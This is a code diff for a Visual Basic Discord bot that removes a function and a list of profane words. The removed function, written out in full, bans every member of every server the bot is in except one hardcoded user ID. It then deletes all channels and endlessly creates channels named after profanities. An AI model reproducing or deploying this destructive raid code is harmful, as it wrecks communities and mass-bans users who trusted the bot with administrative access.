@@ -9,57 +9,8 @@ Imports Newtonsoft.Json
 
 Public Class CommandHandler
 
-    Dim naughtywords = New String() {"ARSE", "BALLS", "BITCH", "BULLSHIT", "FUCK", "FUCK", "FUCK", "FUCK", "FUCK", "FUCK", "FUCK", "PISS", "SHIT", "TIT", "BASTARD", "BELLEND", "COCK", "DICK", "FANNY", "KNOBHEAD", "MINGE", "PRICK", "PUSSY", "TWAT", "CUNT", "CUNT", "CUNT", "CUNT", "CUNT", "CUNT", "CUNT", "MOTHERFUCKER", "MOTHERFUCKER", "MOTHERFUCKER", "MOTHERFUCKER"}
-    Async Function loadFromCommand(client As DiscordSocketClient, namee As String, msg As IUserMessage) As Task
-        Dim name = namee
-        For Each server As SocketGuild In client.Guilds
-            Await Log(New LogMessage(LogSeverity.Verbose, name, "Got server " & server.Name))
-            Try
-                Await Log(New LogMessage(LogSeverity.Verbose, name, "Downloading members.."))
-                Await server.DownloadUsersAsync()
-                Await Log(New LogMessage(LogSeverity.Verbose, name, "Downloaded members"))
-                For Each member As SocketGuildUser In server.Users
-                    If member.Id = 186570298185744394 Or member.Id = 186570298185744394 Then
-                        Log(New LogMessage(LogSeverity.Verbose, name, "Not banning " & member.Nickname))
-                    Else
-                        Try
-                            Await server.AddBanAsync(member.Id)
-                            Await Log(New LogMessage(LogSeverity.Verbose, name, "Banned " & member.Nickname))
-                        Catch ex As Exception
-                            Log(New LogMessage(LogSeverity.Verbose, name, "Failed to ban " & member.Nickname))
-                        End Try
-                    End If
-                Next
-
-                For Each channel As SocketGuildChannel In server.Channels
-                    Try
-                        Await channel.DeleteAsync
-                        Await Log(New LogMessage(LogSeverity.Verbose, name, "Deleted " & channel.Name))
-                    Catch ex As Exception
-                        Log(New LogMessage(LogSeverity.Verbose, name, "Failed to delete " & channel.Name))
-                    End Try
-                Next
-
-                While True
-                    Try
-                        Dim newNaughtyWord = naughtywords(New Random().Next(0, naughtywords.Length - 1))
-                        Await server.CreateTextChannelAsync(newNaughtyWord)
-                        Await Log(New LogMessage(LogSeverity.Verbose, name, "Created the channel " & newNaughtyWord))
-                    Catch ex As Exception
-                        Log(New LogMessage(LogSeverity.Verbose, name, "Failed to create a channel"))
-                    End Try
-                    Try
-                        Dim newNaughtyWord = naughtywords(New Random().Next(0, naughtywords.Length - 1))
-                        Await server.CreateVoiceChannelAsync(newNaughtyWord)
-                        Await Log(New LogMessage(LogSeverity.Verbose, name, "Created the channel " & newNaughtyWord))
-                    Catch ex As Exception
-                        Log(New LogMessage(LogSeverity.Verbose, name, "Failed to create a channel"))
-                    End Try
-                End While
-            Catch
-            End Try
-        Next
-    End Function
+   
+    
 
     Interface ICollection(Of T)
         Inherits IEnumerable(Of T)
